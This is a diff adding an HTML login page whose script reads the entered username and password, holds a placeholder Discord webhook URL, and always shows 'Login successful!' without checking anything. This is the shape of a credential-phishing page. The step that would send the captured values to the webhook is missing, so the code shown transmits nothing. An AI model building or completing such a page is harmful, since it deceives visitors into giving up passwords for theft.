@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="login_page.css">
+</head>
+<body class="container mt-5">
+    <h1>Login</h1>
+    <form id="login-form">
+        <div class="mb-3">
+            <label for="usernameInput" class="form-label">Username</label>
+            <input type="text" class="form-control" id="usernameInput" required>
+        </div>
+        <div class="mb-3">
+            <label for="passwordInput" class="form-label">Password</label>
+            <input type="password" class="form-control" id="passwordInput" required>
+        </div>
+        <div class="mb-3 form-check">
+            <input type="checkbox" class="form-check-input" id="remember-me-checkbox">
+            <label class="form-check-label" for="remember-me-checkbox">Remember me</label>
+        </div>
+        <button type="submit" class="btn btn-primary">Login</button>
+    </form>
+    <script>
+        const loginForm = document.getElementById('login-form');
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace this with your actual Discord webhook URL
+
+        loginForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            // Always allow the user to log in successfully
+            alert('Login successful!');
+            history.back();
+        });
+    </script>
+</body>
+</html>
